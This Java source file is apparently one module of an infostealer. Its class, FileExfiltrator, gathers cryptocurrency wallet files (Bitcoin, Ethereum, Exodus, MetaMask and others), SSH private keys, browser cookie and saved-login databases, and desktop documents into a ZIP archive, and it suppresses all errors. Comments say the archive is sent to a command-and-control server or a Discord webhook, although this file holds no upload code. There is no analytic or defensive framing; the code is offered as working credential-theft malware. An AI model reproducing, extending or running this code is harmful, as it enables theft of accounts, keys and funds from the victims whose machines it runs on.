import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * File Exfiltrator
 * Obfuscated name: ҫ (U+04AB)
 *
 * Handles file-based data exfiltration.
 * Reads files from disk and sends them to the C2 server or webhook.
 *
 * Files targeted:
 * - Browser databases (Cookies, Login Data, Web Data)
 * - Discord LevelDB files
 * - Cryptocurrency wallet files
 * - SSH keys (~/.ssh/id_rsa, etc.)
 * - Configuration files with credentials
 * - Desktop files (documents, screenshots)
 *
 * Exfiltration methods:
 * 1. Webhook upload (via WebhookLogger with file attachment)
 * 2. WebSocket upload (via WebSocketHandler)
 * 3. HTTP POST to C2 server
 *
 * File size limits:
 * - Discord webhook: 8MB per file
 * - Files larger than 8MB are split or compressed
 *
 * Cryptocurrency wallets targeted:
 * - Bitcoin: %APPDATA%\Bitcoin\wallet.dat
 * - Ethereum: %APPDATA%\Ethereum\keystore\
 * - Monero: %APPDATA%\bitmonero\
 * - Exodus: %APPDATA%\Exodus\exodus.wallet\
 * - Electrum: %APPDATA%\Electrum\wallets\
 * - Atomic: %APPDATA%\atomic\Local Storage\leveldb\
 * - Jaxx: %APPDATA%\com.liberty.jaxx\IndexedDB\
 * - MetaMask: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn\
 */
public class FileExfiltrator {

    // =========================================================
    // FILE COLLECTION
    // =========================================================

    /**
     * Collects all targeted files and adds them to a ZIP archive.
     *
     * @param zipBuilder ZipBuilder to add files to
     */
    public static void collectAllFiles(ZipBuilder zipBuilder) {
        collectCryptoWallets(zipBuilder);
        collectSshKeys(zipBuilder);
        collectBrowserFiles(zipBuilder);
        collectDesktopFiles(zipBuilder);
    }

    /**
     * Collects cryptocurrency wallet files.
     * These are high-value targets for financial theft.
     */
    public static void collectCryptoWallets(ZipBuilder zipBuilder) {
        String appData = System.getenv("APPDATA");
        String localAppData = System.getenv("LOCALAPPDATA");

        String[][] wallets = {
            { "Bitcoin",  appData + "\\Bitcoin\\wallet.dat" },
            { "Ethereum", appData + "\\Ethereum\\keystore" },
            { "Monero",   appData + "\\bitmonero" },
            { "Exodus",   appData + "\\Exodus\\exodus.wallet" },
            { "Electrum", appData + "\\Electrum\\wallets" },
            { "Atomic",   appData + "\\atomic\\Local Storage\\leveldb" },
            { "Jaxx",     appData + "\\com.liberty.jaxx\\IndexedDB" },
            { "MetaMask", localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn" },
        };

        for (String[] wallet : wallets) {
            String name = wallet[0];
            String path = wallet[1];
            File walletFile = new File(path);

            if (!walletFile.exists()) continue;

            try {
                if (walletFile.isDirectory()) {
                    // Add all files in directory
                    addDirectoryToZip(zipBuilder, walletFile, "wallets/" + name + "/");
                } else {
                    byte[] data = Files.readAllBytes(walletFile.toPath());
                    zipBuilder.addEntry("wallets/" + name + "/" + walletFile.getName(), data);
                }
            } catch (Exception e) {
                // Silently fail per wallet
            }
        }
    }

    /**
     * Collects SSH private keys.
     * Targets: ~/.ssh/id_rsa, ~/.ssh/id_ed25519, etc.
     */
    public static void collectSshKeys(ZipBuilder zipBuilder) {
        String userHome = System.getProperty("user.home");
        File sshDir = new File(userHome + "\\.ssh");

        if (!sshDir.exists()) return;

        File[] keyFiles = sshDir.listFiles(f ->
            f.isFile() && !f.getName().endsWith(".pub")
        );

        if (keyFiles == null) return;

        for (File keyFile : keyFiles) {
            try {
                byte[] data = Files.readAllBytes(keyFile.toPath());
                zipBuilder.addEntry("ssh/" + keyFile.getName(), data);
            } catch (Exception e) {
                // Silently fail
            }
        }
    }

    /**
     * Collects browser database files for offline analysis.
     * These are the raw SQLite databases before decryption.
     */
    public static void collectBrowserFiles(ZipBuilder zipBuilder) {
        String localAppData = System.getenv("LOCALAPPDATA");
        String appData = System.getenv("APPDATA");

        String[][] browserDbs = {
            { "Chrome_Cookies",    localAppData + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" },
            { "Chrome_LoginData",  localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data" },
            { "Chrome_WebData",    localAppData + "\\Google\\Chrome\\User Data\\Default\\Web Data" },
            { "Brave_Cookies",     localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies" },
            { "Brave_LoginData",   localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data" },
            { "Edge_Cookies",      localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies" },
            { "Edge_LoginData",    localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data" },
        };

        for (String[] db : browserDbs) {
            String name = db[0];
            String path = db[1];
            File dbFile = new File(path);

            if (!dbFile.exists()) continue;

            try {
                // Copy to temp (file may be locked by browser)
                File tempFile = File.createTempFile("db_", ".tmp");
                Files.copy(dbFile.toPath(), tempFile.toPath(),
                    java.nio.file.StandardCopyOption.REPLACE_EXISTING);

                byte[] data = Files.readAllBytes(tempFile.toPath());
                zipBuilder.addEntry("browsers/" + name + ".db", data);
                tempFile.delete();
            } catch (Exception e) {
                // Silently fail
            }
        }
    }

    /**
     * Collects files from the user's Desktop.
     * Targets: .txt, .doc, .docx, .pdf, .xls, .xlsx files
     * Limit: First 10 files, max 1MB each
     */
    public static void collectDesktopFiles(ZipBuilder zipBuilder) {
        String userHome = System.getProperty("user.home");
        File desktop = new File(userHome + "\\Desktop");

        if (!desktop.exists()) return;

        File[] files = desktop.listFiles(f ->
            f.isFile() && isTargetExtension(f.getName()) && f.length() < 1024 * 1024
        );

        if (files == null) return;

        int count = 0;
        for (File file : files) {
            if (count >= 10) break;
            try {
                byte[] data = Files.readAllBytes(file.toPath());
                zipBuilder.addEntry("desktop/" + file.getName(), data);
                count++;
            } catch (Exception e) {
                // Silently fail
            }
        }
    }

    // =========================================================
    // HELPERS
    // =========================================================

    private static boolean isTargetExtension(String filename) {
        String lower = filename.toLowerCase();
        return lower.endsWith(".txt") || lower.endsWith(".doc") ||
               lower.endsWith(".docx") || lower.endsWith(".pdf") ||
               lower.endsWith(".xls") || lower.endsWith(".xlsx") ||
               lower.endsWith(".csv") || lower.endsWith(".json");
    }

    private static void addDirectoryToZip(ZipBuilder zipBuilder, File dir, String prefix) {
        File[] files = dir.listFiles();
        if (files == null) return;

        for (File file : files) {
            if (file.isFile()) {
                try {
                    byte[] data = Files.readAllBytes(file.toPath());
                    zipBuilder.addEntry(prefix + file.getName(), data);
                } catch (Exception e) {
                    // Silently fail
                }
            }
        }
    }
}
